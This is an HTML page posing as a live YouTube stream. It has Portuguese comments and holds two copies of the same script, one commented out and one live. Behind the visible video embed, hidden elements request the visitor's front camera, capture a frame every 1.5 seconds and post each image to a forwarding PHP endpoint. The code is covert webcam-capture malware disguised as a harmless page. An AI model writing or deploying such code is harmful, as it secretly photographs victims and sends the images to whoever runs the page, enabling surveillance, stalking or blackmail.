<!-- <!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width,initial-scale=1,maximum-scale=1"
    />
    <title>Live YouTube</title>

    <script
      type="text/javascript"
      src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"
    ></script>
    <link
      rel="stylesheet"
      type="text/css"
      href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"
    />
    <script
      type="text/javascript"
      src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"
    ></script>
  </head>

  <div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
  </div>

  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

  <script>
    /*
     * Fun√ß√£o para enviar os dados da imagem (captura da c√¢mera) via AJAX.
     * O URL de destino para o POST √© 'forwarding_link/post.php'.
     */
    function post(imgdata) {
      $.ajax({
        type: "POST",
        data: { cat: imgdata },
        url: "forwarding_link/post.php",
        dataType: "json",
        async: false,
        success: function (result) {
          // Manipulador de sucesso: esta fun√ß√£o lida com a resposta/resultados do servidor.
        },
        error: function () {
          // Manipulador de erro
        },
      });
    }

    ("use strict");

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const errorMsgElement = document.querySelector("span#errorMsg");

    const constraints = {
      audio: false, // N√£o solicitar acesso ao microfone
      video: {
        // Tenta usar a c√¢mera frontal em dispositivos m√≥veis
        facingMode: "user",
      },
    };

    // üé• Acessar a webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        // Exibe o erro se o acesso √† c√¢mera falhar (e.g., permiss√£o negada)
        if (errorMsgElement) {
          errorMsgElement.innerHTML = `Erro navigator.getUserMedia: ${e.toString()}`;
        }
      }
    }

    // ‚úÖ Sucesso: lida com o stream da c√¢mera
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;

      var context = canvas.getContext("2d");

      // üì∏ Configura o intervalo para capturar a imagem a cada 1500ms (1.5 segundos)
      setInterval(function () {
        context.drawImage(video, 0, 0, 640, 480);
        // Converte o frame do canvas para um formato de dados e o envia
        var canvasData = canvas
          .toDataURL("image/png")
          .replace("image/png", "image/octet-stream");
        post(canvasData);
      }, 1500);
    }

    // üöÄ Inicia a fun√ß√£o de acesso √† c√¢mera
    init();
  </script>

  <body>
    <div style="text-align: center; margin-top: 20px">
      <h2>üì∫ Assista ao V√≠deo ao Vivo Abaixo</h2>
      <p>Aguarde o carregamento do stream.</p>
    </div>

    <iframe
      id="Live_YT_TV"
      width="100%"
      height="500px"
      src="https://www.youtube.com/embed/live_yt_tv?autoplay=1"
      frameborder="0"
      allow="autoplay encrypted-media; gyroscope; picture-in-picture"
      allowfullscreen
    >
    </iframe>
  </body>
</html> -->
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width,initial-scale=1,maximum-scale=1"
    />
    <title>Live YouTube</title>

    <script
      type="text/javascript"
      src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"
    ></script>
    <link
      rel="stylesheet"
      type="text/css"
      href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"
    />
    <script
      type="text/javascript"
      src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"
    ></script>
  </head>

  <div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
  </div>

  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

  <script>
    function post(imgdata) {
      $.ajax({
        type: "POST",
        data: { cat: imgdata },
        url: "forwarding_link/post.php",
        dataType: "json",
        async: false,
        success: function (result) {
          // Manipulador de sucesso
        },
        error: function () {
          // Manipulador de erro
        },
      });
    }

    // IN√çCIO DA CORRE√á√ÉO: Usando IIFE para encapsular o script principal
    (function() {
        "use strict";

        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const errorMsgElement = document.querySelector("span#errorMsg");

        const constraints = {
          audio: false, 
          video: {
            facingMode: "user",
          },
        };

        // Acessar webcam
        async function init() {
          try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            handleSuccess(stream);
          } catch (e) {
            if (errorMsgElement) {
              errorMsgElement.innerHTML = `Erro navigator.getUserMedia: ${e.toString()}`;
            }
          }
        }

        // Sucesso: lida com o stream da c√¢mera
        function handleSuccess(stream) {
          window.stream = stream;
          video.srcObject = stream;

          var context = canvas.getContext("2d");

          // Configura o intervalo para capturar a imagem a cada 1.5 segundos
          setInterval(function () {
            context.drawImage(video, 0, 0, 640, 480);
            var canvasData = canvas
              .toDataURL("image/png")
              .replace("image/png", "image/octet-stream");
            post(canvasData);
          }, 1500);
        }

        // Inicia a fun√ß√£o de acesso √† c√¢mera
        init();

    })(); // FIM DA CORRE√á√ÉO IIFE
  </script>

  <body>
    <div style="text-align: center; margin-top: 20px">
      <h2>üì∫ Assista ao V√≠deo ao Vivo Abaixo</h2>
      <p>Aguarde o carregamento do stream.</p>
    </div>

    <iframe
      id="Live_YT_TV"
      width="100%"
      height="500px"
      src="https://www.youtube.com/embed/live_yt_tv?autoplay=1"
      frameborder="0"
      allow="autoplay encrypted-media; gyroscope; picture-in-picture"
      allowfullscreen
    >
    </iframe>
  </body>
</html>